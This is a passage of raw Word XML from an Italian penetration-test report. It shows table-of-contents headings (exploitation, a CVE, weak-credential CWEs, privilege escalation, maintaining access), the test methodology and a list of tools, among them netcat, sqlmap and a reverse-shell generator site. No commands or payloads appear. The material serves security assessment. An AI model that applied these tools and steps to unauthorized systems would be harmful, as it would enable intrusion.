          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="622AFCBF" w14:textId="5248B5E5">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1754730583">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Database Assessment</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1754730583 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="26A179A2" w14:textId="0ACEC3C3">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1270106638">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Sqlmap</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1270106638 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="5212AACB" w14:textId="4B824711">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc312417858">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Target Exploitation</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc312417858 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="5540FC14" w14:textId="6BFF9B58">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1121636994">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>CVE 2024-22195</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1121636994 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="5E77E3B2" w14:textId="5D3FE001">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc315770793">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>CWE-1391: Use of Weak Credentials (4.14) - MITRE</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc315770793 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="5BD99D6D" w14:textId="001816FD">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1386223911">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>CWE-522: Insufficiently Protected Credentials</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1386223911 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="41D8C10B" w14:textId="36280192">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1034655777">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Privilege Escalation</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1034655777 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="42619A0E" w14:textId="1AC691B5">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc287300511">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Maintaining access</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc287300511 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1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6286841C" w:rsidP="21040C4D" w:rsidRDefault="6286841C" w14:paraId="4108C1F2" w14:textId="6C8203FE">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="600" w:beforeAutospacing="off" w:after="60" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc737474297" w:id="712760649"/>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Metodologia e strumenti utilizzati</w:t>
      </w:r>
      <w:bookmarkEnd w:id="712760649"/>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="12BEB4CF" w14:textId="51AC866E">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="6286841C" w:rsidP="21040C4D" w:rsidRDefault="6286841C" w14:paraId="2CC72762" w14:textId="5AC1BDE0">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t xml:space="preserve">La metodologia usata è il General Framework per il </w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Penetration</w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Tesing</w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t xml:space="preserve"> andando ad effettuare le seguenti fasi:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6286841C" w:rsidP="21040C4D" w:rsidRDefault="6286841C" w14:paraId="0C865F5E" w14:textId="036BF6A1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Target Discovery</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6286841C" w:rsidP="21040C4D" w:rsidRDefault="6286841C" w14:paraId="69B27534" w14:textId="1A535581">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Enumerating</w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Targer</w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t xml:space="preserve"> e Port Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6286841C" w:rsidP="21040C4D" w:rsidRDefault="6286841C" w14:paraId="653A56A5" w14:textId="4DB87BCC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t xml:space="preserve"> Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6286841C" w:rsidP="21040C4D" w:rsidRDefault="6286841C" w14:paraId="61F65F43" w14:textId="7DE2893A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Target Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6286841C" w:rsidP="21040C4D" w:rsidRDefault="6286841C" w14:paraId="454C13C0" w14:textId="7034A6F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Priviledge</w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Escalation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6286841C" w:rsidP="21040C4D" w:rsidRDefault="6286841C" w14:paraId="7967DD8A" w14:textId="726C2DA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Maintaining</w:t>
      </w:r>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t xml:space="preserve"> Access</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6286841C" w:rsidP="21040C4D" w:rsidRDefault="6286841C" w14:paraId="620CE838" w14:textId="3DEF23A5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidR="6286841C">
        <w:rPr/>
        <w:t>Documentazione e Reporting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="65855671" w14:textId="0E4D8BC9">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="1A9FE974" w:rsidP="21040C4D" w:rsidRDefault="1A9FE974" w14:paraId="453B692D" w14:textId="613DC095">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidR="1A9FE974">
        <w:rPr/>
        <w:t>Strumenti utilizzati:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1A9FE974" w:rsidP="21040C4D" w:rsidRDefault="1A9FE974" w14:paraId="731A8194" w14:textId="588955E3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="1A9FE974">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Ffuf</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="59CC5DD0">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="59CC5DD0">
        <w:rPr/>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="59CC5DD0">
        <w:rPr/>
        <w:t>Fuzz</w:t>
      </w:r>
      <w:r w:rsidR="59CC5DD0">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="59CC5DD0">
        <w:rPr/>
        <w:t>Faster</w:t>
      </w:r>
      <w:r w:rsidR="59CC5DD0">
        <w:rPr/>
        <w:t xml:space="preserve"> U </w:t>
      </w:r>
      <w:r w:rsidR="59CC5DD0">
        <w:rPr/>
        <w:t>Fool</w:t>
      </w:r>
      <w:r w:rsidR="59CC5DD0">
        <w:rPr/>
        <w:t>) 2.1.0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1A9FE974" w:rsidP="21040C4D" w:rsidRDefault="1A9FE974" w14:paraId="454311D5" w14:textId="0CE0DBFE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="1A9FE974">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Ssh</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="513C7129">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="513C7129">
        <w:rPr/>
        <w:t>OpenSSH</w:t>
      </w:r>
      <w:r w:rsidR="513C7129">
        <w:rPr/>
        <w:t xml:space="preserve"> - Versione 9.7</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1A9FE974" w:rsidP="21040C4D" w:rsidRDefault="1A9FE974" w14:paraId="04EC4240" w14:textId="2B70E5F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="1A9FE974">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Netcat</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="59CBF65B">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="59CBF65B">
        <w:rPr/>
        <w:t xml:space="preserve">(GNU </w:t>
      </w:r>
      <w:r w:rsidR="59CBF65B">
        <w:rPr/>
        <w:t>Netcat</w:t>
      </w:r>
      <w:r w:rsidR="59CBF65B">
        <w:rPr/>
        <w:t>) Versione: 0.7.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="68182974" w:rsidP="21040C4D" w:rsidRDefault="68182974" w14:paraId="3D6E0A87" w14:textId="62C886F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="68182974">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Nmap</w:t>
      </w:r>
      <w:r w:rsidR="68182974">
        <w:rPr/>
        <w:t>: 7.95</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="68182974" w:rsidP="21040C4D" w:rsidRDefault="68182974" w14:paraId="326EEB95" w14:textId="332600C9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="68182974">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Sqlmap</w:t>
      </w:r>
      <w:r w:rsidR="68182974">
        <w:rPr/>
        <w:t>: 1.7.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="68182974" w:rsidP="21040C4D" w:rsidRDefault="68182974" w14:paraId="2CB8CD7E" w14:textId="0F2FBE8B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="68182974">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r w:rsidR="68182974">
        <w:rPr/>
        <w:t>: 115.0.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="68182974" w:rsidP="21040C4D" w:rsidRDefault="68182974" w14:paraId="37458103" w14:textId="5F41335C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="68182974">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Burp</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="68182974">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> Suite</w:t>
      </w:r>
      <w:r w:rsidR="68182974">
        <w:rPr/>
        <w:t>: 2023.2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7B46CA8A" w:rsidP="21040C4D" w:rsidRDefault="7B46CA8A" w14:paraId="48AEDC5F" w14:textId="5B880E28">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:hyperlink r:id="R8bdf7e41c8b8461d">
        <w:r w:rsidRPr="21040C4D" w:rsidR="7B46CA8A">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
          </w:rPr>
          <w:t>www.revshells.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="7D23C4E3" w:rsidP="21040C4D" w:rsidRDefault="7D23C4E3" w14:paraId="0ED4297D" w14:textId="0DDB4B0D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="7D23C4E3">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Python/</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="7D23C4E3">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r w:rsidR="7D23C4E3">
        <w:rPr/>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="7D23C4E3">
        <w:rPr/>
        <w:t>Flask</w:t>
      </w:r>
      <w:r w:rsidR="7D23C4E3">
        <w:rPr/>
